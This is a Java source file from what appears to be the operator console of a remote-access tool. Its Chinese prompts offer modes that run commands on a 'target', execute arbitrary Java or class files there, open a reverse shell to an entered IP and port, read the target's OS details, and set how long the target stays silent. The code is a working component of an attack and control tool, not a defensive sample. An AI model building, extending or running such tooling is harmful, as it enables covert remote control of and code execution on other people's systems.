package constant;

import regular.Regulars;

import java.io.*;

public class CheckCommands {
    private String type;
    private String input;
    private String breaks;
    private boolean continueInput;

    public CheckCommands(BufferedReader sin, String type, String input) throws IOException{
        do {
            //初始化
            this.input = "";
            this.breaks = "";
            this.continueInput = false;
            //输入指令，并校验
            input = sin.readLine();
            if (Commands.HELP.equals(input) || "\\h".equals(input)) {
    //            System.out.println("默认模式cmd，可执行控制台命令");
    //            System.out.println("切换模式：\\use cmd（执行控制台命令、默认）、\\use eval（任意代码执行）、\\use rshell（反弹shell）、\\getInitInfo（查看目标操作系统版本信息）、\\shutdown（退出服务端）");
                System.out.println("命令：1执行控制台命令（默认），2反弹shell，3退出服务端，4设置停止连接时间");
                this.continueInput = true;
            }else if (Commands.SHUTDOWN.equals(input) || Commands.STOP.equals(input) || "3".equals(input)) {
                System.out.println("确认退出服务端？y/N");
                input = sin.readLine();
                if("y".equals(input) || "Y".equals(input)){
                    System.out.println("已退出");
                    this.breaks = "break";
                }else{
                    this.continueInput = true;
                    input = "cmd";
                    System.out.println("回到默认模式");
                }
            }else if("\\setDisconnect".equals(input) || "4".equals(input)){
                type = "disconnect";
                System.out.println("请设置禁止连接时间（单位秒），值-1为永久、0取消该操作。");
                input = sin.readLine();
                while ((!input.matches("^(|[1-9][0-9]*)$")) && !"0".equals(input)){
                    System.out.println("请输入正确时间格式：单位秒，值-1为永久、0取消该操作。");
                    input = sin.readLine();
                    System.out.println(input.concat("秒内，目标不会响应服务器。"));
                }
                if("0".equals(input)){
                    System.out.println("操作已取消");
                    this.continueInput = true;
                }
            }

            if (Commands.USE_CMD.equals(input) || "1".equals(input)) {
                type = "cmd";
                System.out.println("切换至默认模式");
                this.continueInput = true;
            } else if (Commands.USE_EVAL.equals(input)) {
                type = "eval";
                System.out.println("切换至：eval");
                System.out.println("请输入执行文件路径，格式如/usr/test.java（文件编码方式GBK）");
                this.continueInput = true;
                if(input.equals("quit") || input.equals("exit")){
                    System.out.println("切换至默认模式");
                    type = "cmd";
                    this.continueInput = true;
                }else{
                    String fileName = "";
                    if(input.lastIndexOf("/") != -1){
                        fileName = input.substring(input.lastIndexOf("/") + 1);
                    }else if(input.lastIndexOf("\\") != -1){
                        fileName = input.substring(input.lastIndexOf("\\") + 1);
                    }
                    String read = "";
                    if(fileName.indexOf(".java") != -1){
                        BufferedReader in = new BufferedReader(new InputStreamReader(new FileInputStream(input),"GBK"));
                        String str = null;
                        while ((str = in.readLine()) != null) {
                            read += str;
                        }
                        in.close();
                    }else if(fileName.indexOf(".class") != -1){
                        BufferedInputStream in = new BufferedInputStream(new FileInputStream(input));
                        byte[] bytes = new byte[1024];
                        int len;
                        while ((len = in.read(bytes)) != -1) {
                            read += new String(bytes,0,len);

                        }
                        in.close();
                    }
                    input = fileName.concat("###:###").concat(read);
                }
            } else if (Commands.RSHELL.equals(input) || "2".equals(input)) {
                type = "rshell";
                System.out.println("请设置反弹shell接收端ip，端口。\r\n格式如：x.x.x.x:1234 或 x.x.x.x 1234\r\n若退出当前模式请执行：exit或quit");
                input = sin.readLine();
                //格式校验
                while (!Regulars.regRshell(input)){
                    if(input.equals("quit") || input.equals("exit")){
                        System.out.println("切换至默认模式");
                        type = "cmd";
                        this.continueInput = true;
                        break;
                    }else {
                        System.err.println("请输入正确格式！\r\n格式如：x.x.x.x:1234 或 x.x.x.x 1234\r\n若退出当前模式请执行：exit或quit");
                        input = sin.readLine();
                    }
                }
            } else if("\\getInitInfo".equals(input)){
                type = input;
            }
        } while (continueInput);

        this.type = type;
        this.input = input;
    }

    public String getType() {
        return type;
    }

    public String getInput() {
        return input;
    }

    public String getBreaks() {
        return breaks;
    }
}
